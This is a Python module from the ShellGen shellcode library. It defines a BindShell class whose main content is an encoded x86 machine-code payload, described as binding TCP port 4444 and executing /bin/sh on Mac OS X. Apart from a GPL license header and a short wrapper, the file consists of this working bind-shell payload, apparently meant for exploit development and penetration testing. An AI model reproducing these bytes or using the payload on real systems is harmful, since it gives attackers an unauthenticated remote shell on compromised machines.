#!/usr/bin/env python

###############################################################################
## Bind to TCP port 4444 and execute /bin/sh in MacOSX/x86                   ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 4444 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

class BindShell (Static):
    """
    "Bind to TCP port 4444 and execute /bin/sh in MacOSX/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
        "\x7e\x85\xb4\x83\xeb\xfc\xe2\xf4\xaf\x3c\xdd\x79\x45\x14\xe4\xec"
        "\x5c\x2c\xed\xa4\xc7\x6f\xd9\x3d\x24\x2c\xc7\xe6\x87\x2c\xef\xa4"
        "\x08\xfe\x1c\x27\x94\x2d\xd7\xde\xad\x26\x48\x34\x75\x14\x48\x34"
        "\x97\x2d\xd7\x04\xdb\xb3\x05\x23\xaf\x7c\xdc\xde\x9f\x26\xd4\xe3"
        "\x94\xb3\x05\xfd\xca\xf7\x74\x4b\x3a\x81\xd5\xdc\xea\x51\xf6\xdc"
        "\xad\x51\xe7\xdd\xab\xf7\x66\xe4\x91\x2a\xd6\xe7\x75\x45\x48\x34"
    )
